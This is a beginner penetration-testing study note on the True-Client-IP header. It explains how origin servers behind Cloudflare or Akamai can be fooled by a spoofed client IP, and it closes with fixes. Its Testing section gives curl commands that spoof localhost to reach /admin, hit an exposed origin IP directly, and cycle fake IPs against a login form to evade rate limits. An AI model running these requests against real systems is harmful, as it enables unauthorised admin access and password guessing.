---
tags: [vapt, http-headers, web, beginner]
difficulty: beginner
module: "03 - HTTP Headers"
topic: "03.10 True-Client-IP — Cloudflare IP Bypass"
---

# 03.10 — True-Client-IP

## What is it?

`True-Client-IP` is a header set by Cloudflare and Akamai to pass the original client IP to the origin server. Cloudflare adds it when "True-Client-IP" is enabled in the dashboard. If an origin server trusts this header and doesn't verify it was set by Cloudflare, attackers can bypass IP-based controls.

---

## How Cloudflare Uses It

```
NORMAL FLOW (with Cloudflare):
  Client (1.2.3.4) → Cloudflare Edge → Origin Server
  
  Cloudflare sets:
    True-Client-IP: 1.2.3.4      ← real client IP
    CF-Connecting-IP: 1.2.3.4    ← alternative Cloudflare header
    X-Forwarded-For: 1.2.3.4, <CF-IP>
  
  Origin server trusts True-Client-IP from Cloudflare.

ATTACK (bypassing Cloudflare):
  Client → Direct to Origin (bypassing Cloudflare!)
  
  Attacker sets:
    True-Client-IP: 127.0.0.1    ← spoofed!
  
  Origin trusts it → attacker appears as localhost!
```

---

## Attack: IP Spoofing via True-Client-IP

```
SCENARIO 1: Origin exposed directly (bypass CDN):
  Find origin IP (SecurityTrails, Shodan, old DNS records)
  Connect directly (bypass Cloudflare WAF + IP filtering!)
  
  Then set True-Client-IP: 127.0.0.1 → admin access!

SCENARIO 2: Origin hidden behind Cloudflare but trusts header:
  Cloudflare itself only adds this header if enabled.
  But any request through Cloudflare carries headers from client too!
  
  If Cloudflare doesn't strip/overwrite client-supplied True-Client-IP:
  Attacker can set it before Cloudflare rewrites it.
  
  (Cloudflare generally overwrites this — but test!)

SCENARIO 3: Staging/testing environment doesn't have Cloudflare:
  Same origin IP, different domain (staging.target.com)
  No Cloudflare → True-Client-IP is attacker-controlled
```

---

## Testing

```bash
# Test if True-Client-IP controls access
curl -H "True-Client-IP: 127.0.0.1" https://target.com/admin
curl -H "True-Client-IP: 10.0.0.1" https://target.com/admin

# Test Cloudflare bypass: find origin IP first
# (Use crt.sh, Shodan, SecurityTrails, old DNS records)
# Then connect to origin directly:
curl -H "Host: target.com" \
     -H "True-Client-IP: 127.0.0.1" \
     https://<ORIGIN-IP>/admin --insecure

# Rate limit bypass
for i in $(seq 1 50); do
  curl -H "True-Client-IP: 10.10.$i.1" https://target.com/login \
    -d "user=admin&pass=test"
done
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Origin trusts True-Client-IP unconditionally | Only trust this header if request came from Cloudflare IP range |
| Cloudflare IP bypass | Restrict origin to only accept connections from Cloudflare IPs |
| Rate limiting by True-Client-IP | Session-based rate limiting instead |

**Cloudflare IP ranges** (for allowlisting):
```
103.21.244.0/22
103.22.200.0/22
103.31.4.0/22
... (see cloudflare.com/ips)
```

---

## Related Notes
- [[11 - CF-Connecting-IP]] — sibling Cloudflare header
- [[02 - X-Forwarded-For]] — the original IP forwarding header
- [[15 - CDNs Content Delivery Networks]] — CDN origin IP discovery
